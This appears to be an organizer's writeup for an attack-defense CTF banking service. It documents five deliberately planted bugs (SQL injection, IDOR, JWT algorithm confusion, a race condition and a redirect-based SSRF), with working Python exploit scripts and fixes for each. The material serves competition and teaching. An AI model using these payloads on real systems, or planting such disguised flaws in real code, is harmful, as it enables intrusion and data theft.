# NeoBank — Vulnerability Writeup

This is the **organizer's writeup**. It documents all five intentional
vulnerabilities, how they map to the checker's flag stores, and how to
exploit them. Players see the service source code but not this file.

## Format

Attack-Defense. Each round:
1. Checker plants fresh flags via ordinary user APIs (no admin endpoints).
2. Teams must steal flags from other teams' instances using the vulnerabilities below.
3. Defenders patch their copy without breaking the SLA.

## Flag stores

| # | Field | Plant flow | Read-back flow |
|---|---|---|---|
| 1 | `transactions.comment` | Register two users → transfer $1 with flag in `comment` | `GET /api/transactions` as either party |
| 2 | `notes.body` (private) | Register user → create private note with flag in `body` | `GET /api/note?id=` as owner |
| 3 | `messages.body` | Register two users → send message with flag in `body` | `GET /api/messages?folder=inbox` as recipient |
| 4 | `merchant_settlements.receipt_note` | Checker runs a merchant webhook that returns a flag in the `note` field; triggers `/api/merchant/pay` | No legitimate read-back path — field is organizer-side reconciliation only |

Stores #1–#3 are protected by the application's access-control logic.
Store #4 has no legitimate read-back endpoint at all — it sits in a
table that exists only for internal settlement reconciliation. The
vulnerabilities below let attackers bypass that logic (or the absence
of an endpoint entirely, in #4's case).

## Merchant integration

The bank acts as a payment processor for third-party merchants. Flow:

1. A merchant registers via `POST /api/merchant/register` with an
   `api_key` and a `callback_url`. The checker registers its own
   merchant pointing at a webhook server it controls.
2. The checker (acting as the merchant) submits an HMAC-SHA256 signed
   `POST /api/merchant/pay` that debits a user account it also owns.
3. The bank commits the payment, then POSTs a signed settlement
   notification to the merchant's `callback_url` with the transaction
   details.
4. The merchant's webhook responds with
   `{"receipt_id": "...", "note": "<FLAG>"}`.
5. The bank stores the returned `note` string in
   `merchant_settlements.receipt_note` for reconciliation. There is
   no API to read this back — it lives only in the database.

The callback is made through a separate `merchant_client` (see
`util/fetch::merchant_client`) with `reqwest::redirect::Policy::none()`
so the SSRF redirect gap used by Vuln 5 does **not** reappear on this
code path. The `callback_url` is still validated through
`ensure_public_url`, so only public HTTPS/HTTP targets on non-blocked
ports are reachable.

Store #4 is reachable only via Vuln 1 (SQLi). A UNION SELECT against
`merchant_settlements.receipt_note` recovers the flag.

## Design notes for organizers

The 2026 edition of this service was restructured specifically to defeat
"ask an LLM to find the bugs" shortcuts. Each vulnerability is split
across at least two files and wrapped in a plausible-sounding helper
whose surface looks defensive. A human doing an hour or two of careful
review should still find them; a pattern-matching code reviewer will
either miss them outright or flag the wrong (safe) call site.

---

## Vuln 1 — SQL Injection in `/api/transactions/stats`

**Maps to flag store:** #1 (`transactions.comment`)

### The bug

The handler no longer builds the `GROUP BY` expression inline. It hands
the raw `group_by` query parameter to `util::bucket::BucketSpec::parse`,
which returns a typed `BucketSpec`. `BucketSpec::as_sql()` then maps
the mode name to a SQL fragment.

`parse` looks strict — it bounds length, rejects empty modes, and
validates that the `mode` part is ASCII alphanumeric. That validation
only covers the portion **before** the first colon. Anything after the
colon is stored verbatim in `arg` and spliced into SQL by `as_sql` for
two of the branches:

```rust
"window" => format!("substr(t.created_at, 1, {})", self.arg),
"tz" => {
    let (offset, width) = self.arg
        .rsplit_once(':').unwrap_or((self.arg.as_str(), "10"));
    format!("substr(datetime(t.created_at, '{}'), 1, {})", offset, width)
}
```

`MAX_SPEC_LEN = 256` is large enough to fit a full UNION payload. The
mode validation gives the reviewer the impression that the input has
already been sanitised; the injection lives entirely inside `arg`.

The final statement (from `handlers::stats`) is:

```sql
SELECT {group_expr} as bucket, COUNT(*) as count, SUM(t.amount) as total
FROM transactions t JOIN users fu ON ... JOIN users tu ON ...
WHERE (t.from_user = ?1 OR t.to_user = ?1) {period}
GROUP BY bucket ORDER BY bucket DESC LIMIT 100
```

### Exploit

```python
import requests

r = requests.post("http://target:8080/api/auth/register",
                  json={"username": "att", "password": "p" * 12})
token = requests.post("http://target:8080/api/auth/login",
    json={"username": "att", "password": "p" * 12}).json()["token"]

# group_by = window:<arg>
# arg closes substr(), pads to 3 columns, UNION SELECTs comment
arg = "1),0,0 FROM transactions t WHERE ?1!='' UNION SELECT comment,0,0 FROM transactions t--"
payload = f"window:{arg}"

r = requests.get("http://target:8080/api/transactions/stats",
    params={"group_by": payload},
    headers={"Authorization": f"Bearer {token}"})

for row in r.json():
    print(row["bucket"])  # leaked transaction comments (flags)
```

The `tz:` branch is also injectable — `rsplit_once(':')` means the
attacker only has to put the injection before the last colon.

The same injection also reaches **flag store #4** by swapping the
UNION target:

```python
arg = ("1),0,0 FROM transactions t WHERE ?1!='' "
       "UNION SELECT receipt_note,0,0 FROM merchant_settlements--")
```

`merchant_settlements.receipt_note` has no legitimate read endpoint,
so SQLi is the only way to surface it.

### Fix

Validate `arg` per mode: parse the window width as `u32` with an upper
bound, or use a parameter placeholder for the prefix length. Drop the
`tz` mode entirely or constrain `offset` to `±HH:MM` with a regex.

---

## Vuln 2 — IDOR in `/api/users/{username}`

**Maps to flag store:** #2 (`notes.body`)

### The bug

The user-profile endpoint returns the user's public info plus their
recent notes so the UI can show "user activity". The SQL filters by
a dedicated `listed` column on the notes table:

```rust
"SELECT n.id, u.username, n.title, n.body, n.created_at
 FROM notes n
 JOIN users u ON u.id = n.owner_id
 WHERE n.owner_id = ?1 AND n.listed = 1
 ORDER BY n.created_at DESC
 LIMIT 10"
```

The comment on the query says *"Archived items (listed=0) are
suppressed so they never appear in activity feeds"* — and that is
exactly what the query does. The comment on the insert (`INSERT INTO
notes (... listed ...) VALUES (..., 1, ...)`) says *"Archiving a
note later flips `listed` to 0 so it drops out of profile
timelines"*. Both comments are consistent.

The bug is in column semantics. `listed` tracks archive/unlisted
status; `visibility` tracks public/private. They are independent
axes. The profile feed filters on `listed` but never touches
`visibility`, so a private note with `listed = 1` (the default for
every freshly-created note) is surfaced through the public profile
endpoint. The `/api/note?id=` endpoint in `handlers/notes.rs` does
check `visibility` correctly, which makes the inconsistency between
the two read-paths plausible — different endpoints, different
filters, different bugs.

### Exploit

```python
attacker_token = ...  # any registered user

r = requests.get(f"http://target:8080/api/users/{victim_username}",
                 headers={"Authorization": f"Bearer {attacker_token}"})

for note in r.json()["recent_notes"]:
    print(note["title"], note["body"])  # private notes leak
```

### Fix

Add `AND n.visibility = 'public'` to the profile-feed query, or
invert the filter to allowlist the single value the feed is meant to
surface. `listed` is orthogonal to access control and should not be
relied on for privacy.

---

## Vuln 3 — JWT Algorithm Confusion (RS256 → HS256)

**Maps to flag store:** #3 (`messages.body`)

### The bug

`auth::verify_token` dispatches on `header.alg`. The RS256 branch
uses the RSA public key, as expected. When `alg = HS256` the code
hands off to `auth::legacy::verify`, a module documented as the
acceptance path for pre-2024 mobile SDK tokens. The legacy verifier
derives the HS256 secret from the RSA public key via HKDF-SHA256:

```rust
// src/auth/legacy.rs
fn session_material(public_params: &[u8]) -> [u8; 32] {
    let hk = hkdf::Hkdf::<Sha256>::new(Some(b"nb-mobile/v1"), public_params);
    let mut out = [0u8; 32];
    hk.expand(b"session-material", &mut out).expect("hkdf expand");
    out
}
```

The surrounding prose makes it read like a compatibility shim:
*"Reproduce the mobile SDK's `deriveSessionMaterial(publicParams)`.
Parameters match the Mobile SDK v1.3 reference implementation …
salt = `nb-mobile/v1`, info = `session-material`, output 32 bytes."*
HKDF is a real KDF, the call shape is textbook, and the module
comment says new code should never touch it — only inbound
compatibility for old apps.

The trap is that HKDF is only a useful primitive when the IKM
(keying material) is secret. Here the IKM is `keys.public_pem()` —
the PEM-encoded RSA public key, which the server serves publicly at
`/api/public-key`. An attacker runs the same HKDF over the
published public key, obtains the identical 32-byte HMAC secret,
and forges any HS256 token they want. The algorithm-confusion
dispatch in `verify_token` then hands the forged token straight to
the legacy branch for validation.

### Exploit

```python
import base64, hashlib, hmac, json, time, requests

def b64url(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def hkdf_sha256(salt, ikm, info, length):
    prk = hmac.new(salt, ikm, hashlib.sha256).digest()
    out, t, ctr = b"", b"", 1
    while len(out) < length:
        t = hmac.new(prk, t + info + bytes([ctr]), hashlib.sha256).digest()
        out += t
        ctr += 1
    return out[:length]

pubkey = requests.get("http://target:8080/api/public-key").text
# reproduce the mobile SDK's session-material derivation
hmac_key = hkdf_sha256(b"nb-mobile/v1", pubkey.encode(), b"session-material", 32)

header  = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
payload = b64url(json.dumps({
    "sub": victim_user_id,
    "username": victim_username,
    "exp": int(time.time()) + 3600,
}).encode())
sig = hmac.new(hmac_key, f"{header}.{payload}".encode(), hashlib.sha256).digest()
token = f"{header}.{payload}.{b64url(sig)}"

r = requests.get("http://target:8080/api/messages?folder=inbox",
                 headers={"Authorization": f"Bearer {token}"})
for msg in r.json():
    print(msg["body"])
```

### Fix

Drop the HS256 arm from `auth::verify_token` entirely (and delete
`auth/legacy.rs`). Pin verification to RS256:

```rust
let validation = Validation::new(Algorithm::RS256);
let dkey = DecodingKey::from_rsa_pem(keys.public_pem())?;
decode::<Claims>(token, &dkey, &validation)
```

---

## Vuln 4 — Race Condition in `/api/notes/preview`

**Maps to flag store:** doesn't directly, but enables Vuln 5 by giving free SSRF.

### The bug

`note_preview` looks like it was hardened:

```rust
let gate_key = format!("preview:{}:{}", claims.sub, body.note_id);
let _gate = match gate::acquire(gate_key) {
    Some(g) => g,
    None => return HttpResponse::Conflict()
        .json(serde_json::json!({"error": "preview already in progress"})),
};
```

The `gate::acquire` RAII guard stops a double-clicked submission from
firing the outbound fetch twice. The gate key, however, is per
`(user, note_id)`. An attacker with **N distinct notes** gets **N
independent gates** and can race all of them in parallel.

Inside the handler the balance is still read and released before the
fetch, and the debit still happens after:

```rust
if owner.1 == "private" {
    let balance: f64 = { /* read, release lock */ };
    if balance < PREVIEW_FEE_PRIVATE { return PaymentRequired; }
}
let response = state.http_client.get(fetch_url).send().await?;
// ... later ...
if owner.1 == "private" {
    let db = state.db.lock().unwrap();
    db.execute("UPDATE users SET balance = balance - ?1 WHERE id = ?2", ...)?;
}
```

All N requests see the same starting balance, all pass the check, all
complete their fetch, and only then debit — the debits stack and the
balance goes negative. With $100 starting balance, ~20 SSRF requests
can run for the cost of 2.

### Exploit

```python
import concurrent.futures, requests

TOKEN = "..."
SSRF_URL = "http://127.0.0.1.nip.io:8081/internal/metrics"

# create N separate notes so each takes its own gate
note_ids = [
    requests.post("http://target:8080/api/notes",
        json={"title": f"n{i}", "body": "x", "visibility": "private"},
        headers={"Authorization": f"Bearer {TOKEN}"}
    ).json()["id"]
    for i in range(20)
]

def preview(nid):
    return requests.post("http://target:8080/api/notes/preview",
        json={"note_id": nid, "url": SSRF_URL},
        headers={"Authorization": f"Bearer {TOKEN}"}).json()

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
    for res in ex.map(preview, note_ids):
        print(res.get("preview", ""))
```

### Fix

Hold the DB lock across the balance read and the debit (or use a
single conditional `UPDATE`:

```sql
UPDATE users SET balance = balance - 50
WHERE id = ?1 AND balance >= 50
```

then check `affected_rows > 0` before doing the fetch). Alternatively
use a per-user gate instead of per-(user, note).

---

## Vuln 5 — SSRF via `/api/notes/preview` → internal metrics

**Maps to flag store:** #3 (`messages.body`) — alternate path

### The bug

`util::fetch::ensure_public_url` is tight on the raw URL. It checks
scheme, rejects blocked ports (including the internal metrics port
`8081`), refuses literal loopback hostnames, and — for every
non-literal domain — calls `to_socket_addrs` and walks the resolved
IPs through `is_internal_address`. A direct request for
`http://127.0.0.1.nip.io:8081/internal/metrics` is rejected twice:
once on the port, again on the resolved IP.

The gap lives in `preview_client()`, which installs a custom
redirect policy:

```rust
.redirect(reqwest::redirect::Policy::custom(|attempt| {
    if attempt.previous().len() >= 3 { return attempt.stop(); }
    if let Some(host) = attempt.url().host_str() {
        if BLOCKLIST_HOSTS.iter().any(|h| h.eq_ignore_ascii_case(host)) {
            return attempt.error("redirect to blocked host");
        }
    }
    attempt.follow()
}))
```

The doc comment claims this "guards against redirects into the
literal internal hostnames". It does — but only literal ones. The
redirect callback never re-runs the full `ensure_public_url`
pipeline: DNS is not resolved, ports are not checked, and
`is_internal_address` is not called. All of that validation was
applied to the original URL and is never re-applied to the redirect
target. The `BLOCKLIST_HOSTS` check is byte-exact; `127.0.0.1.nip.io`
is a different string from `127.0.0.1` so it passes.

The internal HTTP server exposes `/internal/metrics` — a
Prometheus-style page that embeds the most recent 100 messages
including sender, recipient, subject, and **body** — bound to
`127.0.0.1:8081`. Players can only reach it via an in-bank SSRF.

### Exploit

Attacker supplies a public URL that 302-redirects to the internal
target. Any off-the-shelf redirector works; the example uses
httpbin:

```python
import requests
from urllib.parse import quote

# 1. create a private note to attach the preview to
note_id = requests.post("http://target:8080/api/notes",
    json={"title": "x", "body": "x", "visibility": "private"},
    headers={"Authorization": f"Bearer {attacker_token}"}).json()["id"]

# 2. preview a public URL that redirects to the internal metrics page.
#    ensure_public_url validates the first hop (httpbin.org, 443) only;
#    the redirect policy then follows the Location header without
#    re-validating the target host through the full pipeline.
internal = "http://127.0.0.1.nip.io:8081/internal/metrics"
bounce   = f"https://httpbin.org/redirect-to?url={quote(internal)}"

r = requests.post("http://target:8080/api/notes/preview",
    json={"note_id": note_id, "url": bounce},
    headers={"Authorization": f"Bearer {attacker_token}"})

print(r.json()["preview"])  # recent message bodies → flags
```

Combined with **Vuln 4**, the dump becomes free over many rounds.

### Fix

Re-apply the full URL validation (including DNS resolution, port
check, and `is_internal_address`) inside the redirect callback, not
just the literal-hostname blocklist. Or use
`reqwest::redirect::Policy::none()` and run the allowed number of
hops manually, calling `ensure_public_url` on each Location header
before issuing the next request.

---

## Summary

| # | Vuln | Masking | Store | Difficulty |
|---|---|---|---|---|
| 1 | SQLi via `BucketSpec` `arg` splicing | Strict mode validation hides `arg` gap | #1 transactions, #4 merchant settlements | medium |
| 2 | IDOR via `listed` vs `visibility` column mix-up | Feed filters on the wrong orthogonal axis | #2 notes | medium-hard |
| 3 | JWT alg confusion via "legacy HS256" path | HKDF over public key is a real KDF with a public IKM | #3 messages | hard |
| 4 | Per-(user,note) gate bypass | Gate looks sufficient but is per-note | (enables #5) | medium |
| 5 | SSRF via redirect policy not re-validating | `ensure_public_url` is tight; redirect callback is not | #3 messages | medium-hard |

Store #3 has two independent attack paths (JWT and SSRF) — defenders
must patch both to fully protect their messages. Store #4 is reachable
only via the SQLi (Vuln 1); it has no endpoint, which raises the bar
for naive scrapers and rewards attackers who actually read the schema.
